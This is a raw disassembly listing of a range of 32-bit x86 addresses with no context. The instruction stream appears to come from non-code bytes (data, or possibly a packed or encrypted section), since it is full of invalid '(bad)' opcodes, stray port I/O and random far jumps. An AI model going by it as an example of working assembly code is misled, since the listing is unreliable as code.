  412a95:	cmp    DWORD PTR [ebp-0x3ec3bd90],0x60
  412a9c:	push   cs
  412a9d:	mov    DWORD PTR [edi-0x1d43f514],ebx
  412aa3:	jecxz  0x412a57
  412aa5:	dec    esp
  412aa6:	fst    DWORD PTR [ebx+0x65c56caf]
  412aac:	out    0xc9,al
  412aae:	mov    ds:0xe42002c6,eax
  412ab3:	jne    0x412a3d
  412ab5:	push   ebx
  412ab6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ab7:	and    DWORD PTR [ebx-0x1e],edx
  412aba:	out    dx,eax
  412abb:	fimul  DWORD PTR [ebp+eax*4-0x53]
  412abf:	mov    al,0x44
  412ac1:	sub    cl,dl
  412ac3:	ret    0x6b2e
  412ac6:	pop    ebp
  412ac7:	adc    BYTE PTR [ebp+0x1a142235],dh
  412acd:	lods   al,BYTE PTR ds:[esi]
  412ace:	clc    
  412acf:	mov    esi,0x4a2a830c
  412ad4:	adc    al,0x5c
  412ad6:	sub    DWORD PTR [edi-0x5e6c181],ecx
  412adc:	add    BYTE PTR [esi-0x77],dl
  412adf:	and    BYTE PTR [edx],bl
  412ae1:	cli    
  412ae2:	add    esp,DWORD PTR [edx+0x61]
  412ae5:	lock xor bh,cl
  412ae8:	enter  0xb132,0xc9
  412aec:	jns    0x412a9e
  412aee:	dec    eax
  412aef:	xchg   DWORD PTR [ebx+0xf],edx
  412af2:	mov    ds:0xcbcbc852,eax
  412af7:	pop    ebp
  412af8:	jbe    0x412aad
  412afa:	cmp    DWORD PTR [esi-0x32],esi
  412afd:	arpl   WORD PTR [ecx-0x73db40a4],bp
  412b03:	out    dx,al
  412b04:	pop    esp
  412b05:	das    
  412b06:	cmp    BYTE PTR [esi-0x7599364b],dh
  412b0c:	mov    ds:0xb8ef4116,al
  412b11:	fwait
  412b12:	js     0x412ae9
  412b14:	push   ds
  412b15:	mov    eax,0x202df04
  412b1a:	mov    ecx,0xca6c7012
  412b1f:	enter  0x94cc,0xe
  412b23:	mov    eax,ds:0xa8a15f5a
  412b28:	and    BYTE PTR [eax+0x77],cl
  412b2b:	pop    ds
  412b2c:	jae    0x412b2f
  412b2e:	aad    0xe1
  412b30:	fs sub al,0x99
  412b33:	shl    DWORD PTR [ebx+ebp*1-0x3d9ef307],0x26
  412b3b:	inc    BYTE PTR [edx+ecx*4+0x163d5de8]
  412b42:	mov    dl,0xd8
  412b44:	fcos   
  412b46:	cmp    ch,BYTE PTR [esi+0x13]
  412b49:	pop    ds
  412b4a:	sub    ebx,DWORD PTR [esi+edx*1+0x4c60e647]
  412b51:	mov    ds:0xa41fe193,eax
  412b56:	icebp  
  412b57:	mov    bl,0xa2
  412b59:	xchg   esi,eax
  412b5a:	lock push es
  412b5c:	mov    bl,0x24
  412b5e:	in     al,dx
  412b5f:	dec    ecx
  412b60:	add    ebx,ebp
  412b62:	mov    dh,0xac
  412b64:	add    DWORD PTR [edx],ebp
  412b66:	cmp    eax,0x12479ed3
  412b6b:	push   ebx
  412b6c:	sbb    BYTE PTR [ecx-0x40b9f337],dh
  412b72:	sbb    DWORD PTR [ebp-0x59],esi
  412b75:	push   cs
  412b76:	adc    DWORD PTR [edi+0x47edb13c],esp
  412b7c:	outs   dx,DWORD PTR ds:[esi]
  412b7d:	dec    ecx
  412b7e:	push   edx
  412b7f:	dec    ebp
  412b80:	add    eax,0x2a7856c4
  412b85:	(bad)  
  412b86:	adc    cl,dh
  412b88:	(bad)  
  412b89:	stc    
  412b8a:	mov    ah,0x86
  412b8c:	mov    DWORD PTR [esp+ecx*2],esi
  412b8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b90:	xchg   ebp,eax
  412b91:	xchg   ecx,eax
  412b92:	nop
  412b93:	iret   
  412b94:	dec    edi
  412b95:	in     eax,dx
  412b96:	and    al,0x48
  412b98:	in     eax,dx
  412b99:	repz ds jb 0x412ba4
  412b9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b9e:	loope  0x412b5e
  412ba0:	mov    ebp,0x9eec389c
  412ba5:	test   BYTE PTR ds:0x8c7576b3,bh
  412bab:	fstp   QWORD PTR [eax+0x22bceb6]
  412bb1:	dec    ebp
  412bb2:	daa    
  412bb3:	inc    esp
  412bb4:	lods   al,BYTE PTR ds:[esi]
  412bb5:	jne    0x412bf1
  412bb7:	or     dl,bl
  412bb9:	sbb    bl,BYTE PTR [esi+edx*2+0x1496d498]
  412bc0:	inc    ebx
  412bc1:	jno    0x412bee
  412bc3:	aas    
  412bc4:	add    al,0xd9
  412bc6:	jmp    0xb248a8d9
  412bcb:	nop
  412bcc:	mov    bl,0x47
  412bce:	xor    bl,BYTE PTR ds:0x9e5ab8e5
  412bd4:	(bad)  
  412bd5:	and    al,0x18
  412bd7:	and    BYTE PTR [edi],ch
  412bd9:	jne    0x412c1c
  412bdb:	frstor [edx-0x4aa8d29a]
  412be1:	lea    eax,[ebx+ecx*1+0x1596a0ff]
  412be8:	jle    0x412c58
  412bea:	xchg   esi,eax
  412beb:	imul   si,WORD PTR [eax-0x23cf7f30],0xffa4
  412bf3:	push   es
  412bf4:	pop    ebx
  412bf5:	fimul  WORD PTR [eax-0x5a]
  412bf8:	mov    al,ds:0xcd8d67b4
  412bfd:	mov    edx,DWORD PTR [ebp+0x6ca74303]
  412c03:	ins    BYTE PTR es:[edi],dx
  412c04:	pop    ebp
  412c05:	fstp   TBYTE PTR [esi+0x19]
  412c08:	mov    ebp,0x94fe3e7b
  412c0d:	jb     0x412c2a
  412c0f:	pop    ecx
  412c10:	aad    0xfe
  412c12:	mov    eax,DWORD PTR [ebx]
  412c14:	jbe    0x412bcb
  412c16:	into   
  412c17:	sbb    bh,BYTE PTR [ebx-0x34]
  412c1a:	push   ecx
  412c1b:	jno    0x412c33
  412c1d:	mov    ah,0x25
  412c1f:	add    ah,dl
  412c21:	scas   al,BYTE PTR es:[edi]
  412c22:	inc    ebp
  412c23:	mov    edi,0x27c35ea3
  412c28:	aad    0x9d
  412c2a:	jbe    0x412c34
  412c2c:	pop    edx
  412c2d:	inc    esp
  412c2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c2f:	adc    al,0x18
  412c31:	mov    ah,0x57
  412c33:	stos   DWORD PTR es:[edi],eax
  412c34:	cwde   
  412c35:	xor    cl,0x16
  412c38:	mov    dh,0x74
  412c3a:	idiv   DWORD PTR [ecx+0x45]
  412c3d:	(bad)  
  412c3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c3f:	sbb    edx,DWORD PTR cs:[edi-0x6599691f]
  412c46:	mov    ch,0x32
  412c48:	test   eax,0x8e0dc069
  412c4d:	or     al,0x7f
  412c4f:	test   al,0x3e
  412c51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c52:	je     0x412c5c
  412c54:	pop    edi
  412c55:	mov    eax,0x3ed1ac95
  412c5a:	xchg   edi,eax
  412c5b:	neg    edx
  412c5d:	ror    BYTE PTR [ebx],1
  412c5f:	xchg   BYTE PTR [ecx+0x11229bb9],dl
  412c65:	or     al,0x41
  412c67:	mul    BYTE PTR [edx+0x1e]
  412c6a:	push   ebp
  412c6b:	or     eax,edi
  412c6d:	inc    edx
  412c6e:	shr    DWORD PTR [eax-0x7c],cl
  412c71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c72:	pushf  
  412c73:	mov    eax,0xdc763ff9
  412c78:	sub    BYTE PTR [ecx],ah
  412c7a:	retf   0xa595
  412c7d:	shl    ebx,0xde
  412c80:	mov    ecx,0x45654181
  412c85:	xor    BYTE PTR [ebx],cl
  412c87:	adc    eax,0xc1ba451c
  412c8c:	sbb    edx,DWORD PTR [eax+0x2907f287]
  412c92:	aaa    
  412c93:	in     eax,0x2d
  412c95:	cmp    eax,0xef056bf
  412c9a:	and    esp,DWORD PTR [eax+ecx*8+0x6f]
  412c9e:	repz pop esi
  412ca0:	sub    BYTE PTR [eax-0x5],bh
  412ca3:	xor    edi,ebp
  412ca5:	repnz fsub st(3),st
  412ca8:	call   0x86dc:0x4faede1a
  412caf:	int    0xc3
  412cb1:	addr16 loop 0x412ce5
  412cb4:	push   0x2a
  412cb6:	fwait
  412cb7:	jnp    0x412d06
  412cb9:	xchg   ebx,eax
  412cba:	lds    ebp,FWORD PTR [ecx-0x34c1804b]
  412cc0:	(bad)  
  412cc1:	jge    0x412cda
  412cc3:	cdq    
  412cc4:	cmc    
  412cc5:	rcl    BYTE PTR [ecx-0x697438cc],1
  412ccb:	push   ecx
  412ccc:	xlat   BYTE PTR es:[ebx]
  412cce:	jmp    0x6f0c34bf
  412cd3:	push   ecx
  412cd4:	xchg   esi,eax
  412cd5:	test   DWORD PTR [edx-0xc7d9554],0x354801ff
  412cdf:	or     eax,0x588e4c6a
  412ce4:	cmp    al,0xd8
  412ce6:	add    edx,edi
  412ce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ce9:	(bad)  
  412cea:	push   edx
  412ceb:	call   0xd935:0x28f0a1f9
  412cf2:	dec    edi
  412cf3:	mov    esi,0x245f51c5
  412cf8:	ror    DWORD PTR [ecx],0xbe
  412cfb:	gs push edx
  412cfd:	loopne 0x412cfc
  412cff:	repz mov dl,0xed
  412d02:	neg    BYTE PTR [ecx]
  412d04:	cld    
  412d05:	or     BYTE PTR [ebx],cl
  412d07:	(bad)  [ebx+0x6d7351b2]
  412d0d:	xor    eax,0x8dd9b0ad
  412d12:	in     al,0xc7
  412d14:	or     bh,cl
  412d16:	mov    dh,0x6f
  412d18:	inc    dh
  412d1a:	push   edx
  412d1b:	push   edx
  412d1c:	mov    ebx,DWORD PTR [eax+0x3f]
  412d1f:	mov    ah,cl
  412d21:	xchg   ebx,eax
  412d22:	adc    bl,dh
  412d24:	cmp    BYTE PTR [eax-0x6b],ah
  412d27:	call   0x2e56f575
  412d2c:	sub    DWORD PTR [edi+0x1d],0x9e7e08bf
  412d33:	dec    edx
  412d34:	sbb    esp,DWORD PTR [ecx-0x24]
  412d37:	aas    
  412d38:	sub    edx,eax
  412d3a:	inc    eax
  412d3b:	shr    DWORD PTR [eax],1
  412d3d:	push   es
  412d3e:	mov    edi,0xa50e1a8
  412d43:	push   ebp
  412d44:	out    dx,al
  412d45:	xchg   ebx,eax
  412d46:	test   BYTE PTR [ecx+0x188f004f],bh
  412d4c:	sbb    ah,dh
  412d4e:	or     BYTE PTR [ebx+0x185cbeeb],dh
  412d54:	fwait
  412d55:	js     0x412d02
  412d57:	dec    edx
  412d58:	lea    ecx,[ebx+0x4c]
  412d5b:	inc    ecx
  412d5c:	adc    ah,BYTE PTR [edx+0x762b43d7]
  412d62:	jg     0x412ce8
  412d64:	sbb    BYTE PTR [edx+0x1],dh
  412d67:	or     bh,dl
  412d69:	jno    0x412dcb
  412d6b:	cwde   
  412d6c:	sahf   
  412d6d:	pop    ax
  412d6f:	dec    esi
  412d70:	dec    ebx
  412d71:	or     esi,edx
  412d73:	lea    eax,[ecx]
  412d75:	fnstenv [edi]
  412d77:	mov    bh,0xf5
  412d79:	adc    eax,0xa1787fa2
  412d7e:	data16 mov dh,0x15
  412d81:	js     0x412d88
  412d83:	sub    ebx,edx
  412d85:	stc    
  412d86:	lea    edi,[ecx+esi*2-0x38]
  412d8a:	adc    BYTE PTR [esi],0x39
  412d8d:	bound  ecx,QWORD PTR [edi-0x4abc3b17]
  412d93:	pop    ebx
  412d94:	ret    0xb2bc
  412d97:	retf   0x4be6
  412d9a:	dec    ecx
  412d9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d9c:	xchg   BYTE PTR [ecx+ecx*2],dl
  412d9f:	and    DWORD PTR [ecx],0xc18eecc4
  412da5:	dec    edi
  412da6:	ds call 0x76b1:0x745bc8b0
  412dae:	hlt    
  412daf:	int    0x49
  412db1:	test   al,0x77
  412db3:	mov    cl,0xd4
  412db5:	pop    eax
  412db6:	retf   0x2822
  412db9:	sbb    ebp,DWORD PTR [esi-0x1e39e448]
  412dbf:	sub    al,0x15
  412dc1:	enter  0xfc60,0xc3
  412dc5:	aad    0xc5
  412dc7:	mov    dl,0xe4
  412dc9:	mov    bh,0x8b
  412dcb:	ficom  DWORD PTR [edx-0x8]
  412dce:	aam    0x5a
  412dd0:	cs jno 0x412d53
  412dd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dd4:	and    DWORD PTR [eax+0xded0583],edx
  412dda:	lock ja 0x412e26
  412ddd:	dec    ebp
  412dde:	push   ecx
  412ddf:	(bad)  
  412de0:	retf   
  412de1:	shl    dh,0xa2
  412de4:	stc    
  412de5:	imul   esp,DWORD PTR [ebx+0xf],0x73
  412de9:	dec    BYTE PTR [esi-0x30ba7f64]
  412def:	mov    al,ds:0x8d9c3017
  412df4:	retf   0xea17
  412df7:	mov    ds:0xd9966ffa,al
  412dfc:	inc    ebp
  412dfd:	fisttp DWORD PTR [ebp-0x81fb6c9]
  412e03:	bound  sp,DWORD PTR [eax]
  412e06:	or     ebp,DWORD PTR [ebx+0x3a208cf9]
  412e0c:	neg    DWORD PTR cs:0x9d026f8c
  412e13:	adc    ecx,DWORD PTR [ebx]
  412e15:	sbb    bh,BYTE PTR [ecx+esi*4+0x6d]
  412e19:	push   cs
  412e1a:	add    esp,DWORD PTR ds:0x48e40fb4
  412e20:	lahf   
  412e21:	fiadd  WORD PTR [edi-0x1551ac5c]
  412e27:	sbb    DWORD PTR [ecx],esp
  412e29:	fstp   QWORD PTR [esi-0x29]
  412e2c:	out    dx,eax
  412e2d:	mov    bh,0xa0
  412e2f:	arpl   di,si
  412e31:	add    DWORD PTR [ebp+edi*8+0x27],edx
  412e35:	jmp    0x412e38
  412e37:	and    eax,0xb5376f7c
  412e3c:	push   cs
  412e3d:	aas    
  412e3e:	pop    ebx
  412e3f:	sub    eax,0x353645ea
  412e44:	xchg   ebp,eax
  412e45:	jge    0x412e11
  412e47:	imul   ecx,DWORD PTR [edi-0x74],0x7b
  412e4b:	jmp    0xb2912dbe
  412e50:	mov    ecx,0x5efc8eae
  412e55:	out    dx,eax
  412e56:	dec    ecx
  412e57:	sti    
  412e58:	addr16 jnp 0x412eb2
  412e5b:	test   al,0x25
  412e5d:	jb     0x412ebc
  412e5f:	das    
  412e60:	sar    BYTE PTR [edx+0x27],1
  412e63:	popa   
  412e64:	in     eax,0x4
  412e66:	je     0x412e0a
  412e68:	push   0xffffffbf
  412e6a:	leave  
  412e6b:	repnz inc BYTE PTR [eax]
  412e6e:	push   edi
  412e6f:	imul   ebp,DWORD PTR [eax-0x9a82f90],0x78be6210
  412e79:	adc    eax,0xe9cca9ee
  412e7e:	clc    
  412e7f:	and    al,0x4d
  412e81:	ins    DWORD PTR es:[edi],dx
  412e82:	(bad)  
  412e83:	xchg   ebx,eax
  412e84:	ins    BYTE PTR es:[edi],dx
  412e85:	ror    edx,1
  412e87:	stos   DWORD PTR es:[edi],eax
  412e88:	xchg   edi,eax
  412e89:	(bad)  
  412e8a:	(bad)  
  412e8b:	jle    0x412e2b
  412e8d:	cmp    DWORD PTR [ebx-0xa1bd38f],edx
  412e93:	iret   
  412e94:	retf   0x8071
  412e97:	shr    ebp,cl
  412e99:	pop    ebp
  412e9a:	pop    edx
  412e9b:	sub    dh,ch
  412e9d:	xor    al,0x1
  412e9f:	pop    edi
  412ea0:	pop    esp
  412ea1:	inc    edi
  412ea2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ea3:	mov    bh,0x54
  412ea5:	int    0x62
  412ea7:	jne    0x412e53
  412ea9:	ds cdq 
  412eab:	fld    TBYTE PTR [ecx+0x48]
  412eae:	mov    esp,0xf19938e9
  412eb3:	sbb    bh,BYTE PTR [esi+0x18495100]
  412eb9:	fidiv  WORD PTR [ebp-0x5ab014ae]
  412ebf:	cli    
  412ec0:	leave  
  412ec1:	aaa    
  412ec2:	stos   DWORD PTR es:[edi],eax
  412ec3:	xchg   edi,eax
  412ec4:	push   0xc522ba4c
  412ec9:	ds xchg ebp,eax
  412ecb:	push   eax
  412ecc:	(bad)  
  412ecd:	xchg   ebx,eax
  412ece:	fadd   QWORD PTR [ecx-0x406be41d]
  412ed4:	adc    al,0xbb
  412ed6:	sbb    DWORD PTR [edx+0x56ff7e4f],esi
  412edc:	aam    0x86
  412ede:	dec    eax
  412edf:	pop    esp
  412ee0:	adc    bh,BYTE PTR [ecx-0x5e]
  412ee3:	pop    edi
  412ee4:	ret    0x192c
  412ee7:	push   es
  412ee8:	or     BYTE PTR [eax],dl
  412eea:	stc    
  412eeb:	mov    ds:0x5cb8e15f,al
  412ef0:	jno    0x412ef6
  412ef2:	add    ah,BYTE PTR [esi]
  412ef4:	dec    esp
  412ef5:	icebp  
  412ef6:	cmp    BYTE PTR [ebx+0x57cea8e9],bl
  412efc:	cld    
  412efd:	in     al,dx
  412efe:	xchg   DWORD PTR [ebx+0x4],edx
  412f01:	(bad)  
  412f02:	fcomp  DWORD PTR [esi+0x5f94d29f]
  412f08:	add    BYTE PTR [edi+0x20edb517],bh
  412f0e:	std    
  412f0f:	xchg   edx,eax
  412f10:	mov    ds:0xa856baf4,al
  412f15:	or     bh,cl
  412f17:	fdiv   st(0),st
  412f19:	mov    bh,0x26
  412f1b:	mov    bh,0x52
  412f1d:	mov    al,0xe2
  412f1f:	fst    DWORD PTR [edx]
  412f21:	pop    ecx
  412f22:	loope  0x412eaf
  412f24:	and    edx,DWORD PTR [ebp-0x2f]
  412f27:	das    
  412f28:	(bad)  
  412f29:	loop   0x412ec8
  412f2b:	aam    0x1d
  412f2d:	mov    BYTE PTR [edi],al
  412f2f:	mov    esp,0x64bf9cf0
  412f34:	aad    0x5c
  412f36:	push   ebx
  412f37:	mov    ah,0xb7
  412f39:	inc    esp
  412f3a:	mov    ebx,0xa8317694
  412f3f:	int3   
  412f40:	pop    es
  412f41:	in     eax,dx
  412f42:	lods   eax,DWORD PTR ds:[esi]
  412f43:	cmp    ch,BYTE PTR [edi+0x2e]
  412f46:	fdivr  st(2),st
  412f48:	sub    eax,0x1fb8b8ca
  412f4d:	add    al,0xe
  412f4f:	xor    DWORD PTR [edi-0x3],ebp
  412f52:	xchg   DWORD PTR [ebp+ecx*2-0x24],edi
  412f56:	xor    eax,0xf05d67f
  412f5b:	mov    dx,0x854d
  412f5f:	jge    0x412ef0
  412f61:	and    BYTE PTR [eax-0x7c],bh
  412f64:	in     al,0x10
  412f66:	ja     0x412f74
  412f68:	pop    di
  412f6a:	mov    ch,0xe5
  412f6c:	nop
  412f6d:	bound  ecx,QWORD PTR [ebx+0x35]
  412f70:	xlat   BYTE PTR ds:[ebx]
  412f71:	add    ch,ch
  412f73:	sbb    ch,cl
  412f75:	fxch   st(4)
  412f77:	out    0xfe,eax
  412f79:	xchg   edi,eax
  412f7a:	mov    dh,0x69
  412f7c:	loope  0x412f93
  412f7e:	mov    al,ds:0x460a1f23
  412f83:	stc    
  412f84:	outs   dx,BYTE PTR ds:[esi]
  412f85:	hlt    
  412f86:	cwde   
  412f87:	push   DWORD PTR [ecx-0x5d]
  412f8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f8b:	neg    DWORD PTR [edx+0x5d]
  412f8e:	xchg   edi,eax
  412f8f:	adc    bl,al
  412f91:	add    al,0xa7
  412f93:	dec    ebp
  412f94:	inc    esi
  412f95:	mov    ch,0x6b
  412f97:	adc    dh,BYTE PTR [ecx+0x44]
  412f9a:	fsub   DWORD PTR [ebx+0x14]
  412f9d:	push   ebp
  412f9e:	(bad)  
  412f9f:	jg     0x412f37
  412fa1:	mov    ds,WORD PTR [eax+0x71]
  412fa4:	fmul   DWORD PTR [esi]
  412fa6:	jns    0x412f59
  412fa8:	push   esp
  412fa9:	sub    esp,edi
  412fab:	retf   0x2a61
  412fae:	pop    es
  412faf:	inc    esp
  412fb0:	push   cs
  412fb1:	inc    edx
  412fb2:	jp     0x412f7c
  412fb4:	add    ah,BYTE PTR gs:[edi-0x3f209ba8]
  412fbb:	les    edi,FWORD PTR ds:0xf5432dec
  412fc1:	das    
  412fc2:	push   ebp
  412fc3:	(bad)
  412fc7:	or     bh,BYTE PTR [ebp+0x1bbcd30b]
  412fcd:	or     ch,BYTE PTR ds:0xd93b9b5f
  412fd3:	jl     0x412fbf
  412fd5:	dec    edi
  412fd6:	or     BYTE PTR [ebx+eax*4],ah
  412fd9:	test   BYTE PTR [esi+0x54947db0],bh
  412fdf:	push   0xffffffa5
  412fe1:	cdq    
  412fe2:	or     al,0xe6
  412fe4:	ins    DWORD PTR es:[edi],dx
  412fe5:	mov    ds:0x4890be02,eax
  412fea:	fbstp  TBYTE PTR [esi]
  412fec:	mov    ebp,0x251de283
  412ff1:	jp     0x412fff
  412ff3:	dec    eax
  412ff4:	stos   DWORD PTR es:[edi],eax
  412ff5:	mov    al,0x89
  412ff7:	jge    0x413006
  412ff9:	push   edx
  412ffa:	jbe    0x41306d
  412ffc:	jo     0x412fc7
  412ffe:	jp     0x41305b
  413000:	fcmovne st,st(0)
  413002:	lsl    esi,WORD PTR [ebx+0x65d5a00f]
  413009:	cdq    
  41300a:	test   DWORD PTR [edx+0x29],0x93e8529a
  413011:	mov    bl,0x2f
  413013:	in     al,0xeb
  413015:	mov    edi,0x2ab0f54
  41301a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41301b:	sbb    ah,ch
  41301d:	add    al,0xc9
  41301f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413020:	sti    
  413021:	lds    ecx,FWORD PTR [esi+0x2c]
  413024:	sub    BYTE PTR [ebp+edi*2+0x12],dh
  413028:	outs   dx,BYTE PTR fs:[esi]
  41302a:	retf   0xe632
  41302d:	xor    DWORD PTR [ebx-0xc],0xffffffc9
  413031:	push   edx
  413032:	jae    0x413028
  413034:	popf   
  413035:	add    eax,0x3af2abba
  41303a:	mov    al,0x7b
  41303c:	push   esi
  41303d:	test   BYTE PTR [eax-0x37],ah
  413040:	outs   dx,BYTE PTR ds:[esi]
  413041:	or     al,BYTE PTR [esi+0x54]
  413044:	aaa    
  413045:	jle    0x413066
  413047:	mov    ebp,0x75473906
  41304c:	push   esi
  41304d:	cmc    
  41304e:	sbb    edx,DWORD PTR [ebp-0x477ad85e]
  413054:	or     DWORD PTR [ebp+0x5ffff766],0x1ad8e722
  41305e:	add    ah,cl
  413060:	jmp    0x41305d
  413062:	inc    edx
  413063:	push   edi
  413064:	ins    BYTE PTR es:[edi],dx
  413065:	popa   
  413066:	cmp    DWORD PTR [edx+0x2cf6f53c],esi
  41306c:	out    dx,eax
  41306d:	pop    ecx
  41306e:	mov    dh,0xf2
  413070:	sbb    DWORD PTR [edi-0x2f0057d0],esp
  413076:	mov    edi,edx
  413078:	(bad)  
  413079:	mov    edi,0x4d151075
  41307e:	out    0x49,al
  413080:	cld    
  413081:	push   cs
  413082:	mov    gs,WORD PTR [ecx]
  413084:	cmp    bl,BYTE PTR [ecx+0x4c]
  413087:	ins    DWORD PTR es:[edi],dx
  413088:	mov    BYTE PTR [edi+0x6a2711e3],ch
  41308e:	call   0xfdc2:0x3b5f3fe0
  413095:	push   ss
  413096:	add    ecx,esp
  413098:	retf   
  413099:	sbb    al,0x56
  41309b:	popf   
  41309c:	pushf  
  41309d:	mov    bh,0x66
  41309f:	push   ds
  4130a0:	popf   
  4130a1:	jae    0x413083
  4130a3:	sbb    BYTE PTR [edx+0x6311a268],cl
  4130a9:	or     al,0x8f
  4130ab:	push   eax
  4130ac:	mov    ds:0x418496e,al
  4130b1:	retf   
  4130b2:	mov    esp,0x1fbbd751
  4130b7:	pop    edx
  4130b8:	repnz in eax,0x9f
  4130bb:	cmp    BYTE PTR [esp+ecx*2+0x6c],ch
  4130bf:	add    al,0x3f
  4130c1:	jae    0x4130e9
  4130c3:	loopne 0x41309e
  4130c5:	sub    ah,dl
  4130c7:	shr    BYTE PTR [edi-0x15cc5fa3],0x32
  4130ce:	imul   ebx,DWORD PTR [esi+0x4b670e17],0xfffffffa
  4130d5:	js     0x413115
  4130d7:	cli    
  4130d8:	ss inc esp
  4130da:	out    dx,eax
  4130db:	jne    0x413125
  4130dd:	jge    0x4130e0
  4130df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130e0:	out    dx,al
  4130e1:	mov    bh,0xfa
  4130e3:	cmp    ebp,DWORD PTR [esi+esi*4-0x15]
  4130e7:	mov    al,0xc3
  4130e9:	retf   0xf743
  4130ec:	mov    bl,0xcd
  4130ee:	jg     0x413108
  4130f0:	mov    al,0xc
  4130f2:	jle    0x41314c
  4130f4:	lahf   
  4130f5:	xchg   ebp,eax
  4130f6:	ret    
  4130f7:	adc    edi,DWORD PTR [ecx-0x4f]
  4130fa:	sub    al,0xa8
  4130fc:	jmp    0x7eb3:0xf445c53a
  413103:	add    dl,BYTE PTR [ecx]
  413105:	sti    
  413106:	clc    
  413107:	or     ah,BYTE PTR [edi-0x4cbb9ea8]
  41310d:	test   eax,0x230b141
  413112:	outs   dx,DWORD PTR ds:[esi]
  413113:	in     al,0x34
  413115:	dec    edx
  413116:	lahf   
  413117:	dec    edx
  413118:	loop   0x413134
  41311a:	js     0x413110
  41311c:	push   esi
  41311d:	arpl   WORD PTR [ebx],bx
  41311f:	call   0xffef:0x19633bd4
  413126:	adc    al,0xa5
  413128:	out    0xda,al
  41312a:	cmp    eax,0xc47817a9
  41312f:	adc    eax,edi
  413131:	sub    DWORD PTR [ebp+0x680e35d2],ecx
  413137:	xchg   BYTE PTR [edx+eiz*2+0x6],dh
  41313b:	push   ds
  41313c:	mov    cl,0xc3
  41313e:	mov    edx,0x5bf65ecb
  413143:	imul   esi,DWORD PTR [ebp-0x5bd361b5],0xffffffe6
  41314a:	les    edx,FWORD PTR [edi+0x5096177a]
  413150:	push   esi
  413151:	mov    ch,BYTE PTR [edx+0x63]
  413154:	and    ebx,DWORD PTR [eax-0x1]
  413157:	mov    eax,0xb936168e
  41315c:	push   edi
  41315d:	xchg   BYTE PTR [edi+eiz*1-0x1e],ah
  413161:	adc    edx,DWORD PTR [eax-0xd8301a4]
  413167:	lock cmp BYTE PTR [esi-0xe],cl
  41316b:	push   ebp
  41316c:	enter  0x1f57,0x66
  413170:	ds xchg edi,eax
  413172:	adc    ebp,DWORD PTR [ebp-0x15]
  413175:	sahf   
  413176:	mov    dl,0x15
  413178:	mov    bl,0xd4
  41317a:	xor    BYTE PTR [ebp-0x359b3bd3],0xa4
  413181:	push   edi
  413182:	jecxz  0x41311d
  413184:	xchg   ecx,eax
  413185:	icebp  
  413186:	shl    DWORD PTR [eax],cl
  413188:	ss mov edi,0x371b926a
  41318e:	sub    eax,0xbc14a693
  413193:	and    ebx,edi
  413195:	mov    WORD PTR [edi+ecx*2+0x34b08e7c],es
  41319c:	mov    cl,BYTE PTR [esi+0x49]
  41319f:	ds leave 
  4131a1:	or     al,0x5
  4131a3:	cmp    BYTE PTR [esi+edx*4-0x51],bh
  4131a7:	fstp   TBYTE PTR [edx]
  4131a9:	mov    eax,0x4ade453f
  4131ae:	mov    edx,0x61f28495
  4131b3:	inc    esi
  4131b4:	fnstsw WORD PTR ds:0x969fe353
  4131ba:	ret    0x5397
  4131bd:	sti    
  4131be:	and    ah,BYTE PTR [eax-0x6711db66]
  4131c4:	pop    esi
  4131c5:	push   eax
  4131c6:	mov    esp,0x3c3e689e
  4131cb:	xchg   ebp,eax
  4131cc:	out    0x4f,al
  4131ce:	test   al,0xed
  4131d0:	shl    dl,1
  4131d2:	pop    eax
  4131d3:	ins    DWORD PTR es:[edi],dx
  4131d4:	jo     0x41316b
  4131d6:	and    al,0xa6
  4131d8:	cmp    al,0x7c
  4131da:	mov    edx,0x74b26986
  4131df:	mov    edx,0xc784401b
  4131e4:	pop    ecx
  4131e5:	test   eax,0x3c828074
  4131ea:	adc    al,0x7a
  4131ec:	push   ds
  4131ed:	sub    DWORD PTR [eax],ecx
  4131ef:	or     DWORD PTR [ecx+0x2],esi
  4131f2:	push   esp
  4131f3:	sbb    BYTE PTR [edi],0xb5
  4131f6:	jle    0x41325f
  4131f8:	push   0xffffffef
  4131fa:	(bad)  
  4131fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131fc:	sbb    eax,ebp
  4131fe:	xor    BYTE PTR [esi-0x26],0x31
  413202:	xchg   esi,eax
  413203:	(bad)  
  413204:	mov    esi,0xfa6c8798
  413209:	cwde   
  41320a:	inc    esi
  41320b:	push   esp
  41320c:	leave  
  41320d:	ja     0x41324f
  41320f:	shr    esp,1
  413211:	mov    WORD PTR [ebx],ss
  413213:	cmp    edi,edi
  413215:	in     eax,0x63
  413217:	pmulhw mm5,QWORD PTR [edi-0x219cd38f]
  41321e:	push   edi
  41321f:	or     dh,dh
  413221:	push   es
  413222:	lods   eax,DWORD PTR ds:[esi]
  413223:	jp     0x413224
  413225:	cld    
  413226:	pop    ebp
  413227:	jns    0x413280
  413229:	mov    DWORD PTR ds:0xe5f1318b,edi
  41322f:	mov    eax,0x37d8130b
  413234:	mov    eax,ds:0xae6aead6
  413239:	push   esp
  41323a:	inc    esi
  41323b:	imul   ecx,DWORD PTR [eax],0xd1ba1864
  413241:	mov    ds:0xa4d84c42,eax
  413246:	mov    edx,0x2b9ad01a
  41324b:	iret   
  41324c:	leave  
  41324d:	adc    eax,0x57e661d6
  413252:	cmp    edi,edx
  413254:	inc    edx
  413255:	push   edx
  413256:	sub    edi,ebx
  413258:	(bad)  
  413259:	repz mov al,0x4a
  41325c:	or     DWORD PTR [edx-0x7],edi
  41325f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413260:	xchg   BYTE PTR [ecx+0x55990535],ah
  413266:	sti    
